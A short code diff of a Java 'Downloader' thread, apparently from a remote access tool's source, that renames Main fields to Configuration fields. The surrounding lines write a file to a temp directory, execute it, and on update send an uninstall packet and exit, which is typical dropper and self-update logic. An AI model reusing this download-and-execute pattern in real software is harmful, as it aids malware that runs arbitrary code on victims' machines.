@@ -35,7 +35,7 @@ public class Downloader extends Thread {
 			try {
 				File file = null;
 				if (update) {
-					file = File.createTempFile(Main.name + (new Random()).nextInt(), ".jar");
+					file = File.createTempFile(Configuration.name + (new Random()).nextInt(), ".jar");
 				} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 					file = new File(System.getProperty("java.io.tmpdir"), fileName);
 				} else {
@@ -66,7 +66,7 @@ public class Downloader extends Thread {
 					}
 					new Packet36Uninstall().read();
 					type.execute(file);
-					Main.running = false;
+					Configuration.running = false;
 					System.exit(0);
 				} else {
 					type.execute(file);
